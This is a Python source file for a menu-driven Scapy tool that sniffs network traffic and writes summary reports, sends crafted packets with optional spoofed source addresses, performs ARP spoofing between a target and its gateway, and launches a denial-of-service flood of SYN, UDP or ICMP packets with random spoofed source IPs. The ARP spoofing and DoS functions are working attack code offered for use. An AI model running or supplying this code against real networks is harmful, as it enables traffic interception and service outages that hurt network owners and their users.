from scapy.all import *
import random
import time
import os

def print_banner():
    print("""
    ██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗    
    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝    
    ██████╔╝███████║██║     █████╔╝ █████╗     ██║       
    ██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║       
    ██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║       
    ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝       
    """)

def generate_report(packets, report_file):
    """ Analyze captured packets and generate a network report """
    protocol_count = {}
    ip_sources = {}

    for pkt in packets:
        if IP in pkt:
            src_ip = pkt[IP].src
            ip_sources[src_ip] = ip_sources.get(src_ip, 0) + 1

        proto = pkt.summary().split()[0]
        protocol_count[proto] = protocol_count.get(proto, 0) + 1

    with open(report_file, "w") as f:
        f.write("==== Network Analysis Report ====\n")
        f.write(f"Total Packets Captured: {len(packets)}\n\n")
        
        f.write("🔹 Protocol Distribution:\n")
        for proto, count in protocol_count.items():
            f.write(f"  - {proto}: {count} packets\n")
        
        f.write("\n🔹 Top 5 Source IPs:\n")
        sorted_ips = sorted(ip_sources.items(), key=lambda x: x[1], reverse=True)[:5]
        for ip, count in sorted_ips:
            f.write(f"  - {ip}: {count} packets\n")

    print(f"[+] Network report saved to {report_file}")

def scan_network(interface, output_file=None):
    print(f"[*] Sniffing on {interface}... Press Ctrl+C to stop.")
    packets = sniff(iface=interface, prn=lambda pkt: pkt.summary(), store=True)
    
    if output_file:
        wrpcap(output_file, packets)
        print(f"[+] Packets saved to {output_file}")
        report_file = output_file.replace(".pcap", "_report.txt")
        generate_report(packets, report_file)

def send_packet(destination, protocol, port, spoof_ip=None, custom_data=None):
    print(f"[*] Sending {protocol.upper()} packet to {destination}:{port}")

    if protocol.lower() == "icmp":
        packet = IP(dst=destination, src=spoof_ip if spoof_ip else None) / ICMP()
    elif protocol.lower() == "tcp":
        packet = IP(dst=destination, src=spoof_ip if spoof_ip else None) / TCP(dport=int(port), flags="S")
    elif protocol.lower() == "udp":
        packet = IP(dst=destination, src=spoof_ip if spoof_ip else None) / UDP(dport=int(port))
    else:
        print("[!] Unsupported protocol!")
        return

    if custom_data:
        packet = packet / Raw(load=custom_data)

    send(packet, verbose=False)
    print("[+] Packet sent!")

def arp_spoof(target_ip, gateway_ip, interface):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[!] Could not get MAC addresses. Check IPs.")
        return

    print(f"[*] Spoofing {target_ip} to think we are {gateway_ip}")
    
    spoof_pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(spoof_pkt, iface=interface, verbose=False)

def capture_quic(interface, count, output_file=None):
    print(f"[*] Capturing QUIC packets on {interface}... Press Ctrl+C to stop.")
    packets = sniff(iface=interface, filter="udp port 443", count=count, store=True)

    if output_file:
        wrpcap(output_file, packets)
        print(f"[+] QUIC packets saved to {output_file}")
        report_file = output_file.replace(".pcap", "_report.txt")
        generate_report(packets, report_file)

def intercept_traffic(interface, filter_exp, output_file=None):
    print(f"[*] Intercepting packets on {interface} with filter: {filter_exp}")
    packets = sniff(iface=interface, filter=filter_exp, store=True)

    if output_file:
        wrpcap(output_file, packets)
        print(f"[+] Intercepted packets saved to {output_file}")
        report_file = output_file.replace(".pcap", "_report.txt")
        generate_report(packets, report_file)

def dos_attack(target_ip, attack_type, port, num_packets):
    print(f"🔥 [*] Starting {attack_type.upper()} DoS attack on {target_ip}...")

    for i in range(num_packets):
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        
        if attack_type.lower() == "tcp":
            packet = IP(dst=target_ip, src=src_ip) / TCP(dport=port, flags="S")
        elif attack_type.lower() == "udp":
            packet = IP(dst=target_ip, src=src_ip) / UDP(dport=port) / Raw(load="X" * 1024)
        elif attack_type.lower() == "icmp":
            packet = IP(dst=target_ip, src=src_ip) / ICMP()
        else:
            print("[!] Unsupported attack type!")
            return

        send(packet, verbose=False)
        print(f"🔥 [Packet {i+1}] Sent to {target_ip}")

    print(f"✅ DoS Attack on {target_ip} completed!")

def display_menu():
    print_banner()
    print("1️⃣  Scan Network (Sniff packets)")
    print("2️⃣  Send a Custom Packet")
    print("3️⃣  Perform ARP Spoofing")
    print("4️⃣  Capture QUIC Packets (UDP/443)")
    print("5️⃣  Intercept & Modify Packets")
    print("6️⃣  Launch a DoS Attack")
    print("0️⃣  Exit\n")

def main():
    while True:
        display_menu()
        choice = input("Enter your choice (0-6): ")

        if choice == "1":
            print("\n🔹 Scan Network")
            interface = input("Enter Network Interface (e.g., eth0, wlan0): ")
            output_file = input("Enter Output File Name to Save Packets (e.g., capture.pcap): ")
            scan_network(interface, output_file)

        elif choice == "2":
            print("\n🔹 Send a Custom Packet")
            destination = input("Enter Destination IP: ")
            protocol = input("Enter Protocol (icmp/tcp/udp): ").lower()
            port = input("Enter Destination Port (0 for ICMP): ")
            spoof_ip = input("Enter Spoofed Source IP (or leave blank): ")
            custom_data = input("Enter Custom Data to Send (or leave blank): ")
            send_packet(destination, protocol, int(port), spoof_ip, custom_data)

        elif choice == "3":
            print("\n🔹 Perform ARP Spoofing")
            target_ip = input("Enter Target IP: ")
            gateway_ip = input("Enter Gateway IP: ")
            interface = input("Enter Network Interface: ")
            arp_spoof(target_ip, gateway_ip, interface)

        elif choice == "4":
            print("\n🔹 Capture QUIC Packets")
            interface = input("Enter Network Interface: ")
            count = int(input("Enter Number of Packets to Capture: "))
            output_file = input("Enter Output File Name (e.g., quic.pcap): ")
            capture_quic(interface, count, output_file)

        elif choice == "5":
            print("\n🔹 Intercept & Modify Packets")
            interface = input("Enter Network Interface: ")
            filter_exp = input("Enter Packet Filter Expression (e.g., tcp port 80): ")
            output_file = input("Enter Output File Name: ")
            intercept_traffic(interface, filter_exp, output_file)

        elif choice == "6":
            print("\n🔹 Launch a DoS Attack")
            target_ip = input("Enter Target IP: ")
            attack_type = input("Enter Attack Type (tcp/udp/icmp): ")
            port = int(input("Enter Target Port: "))
            num_packets = int(input("Enter Number of Packets: "))
            dos_attack(target_ip, attack_type, port, num_packets)

        elif choice == "0":
            print("🔹 Exiting... Goodbye!")
            break

if __name__ == "__main__":
    main()
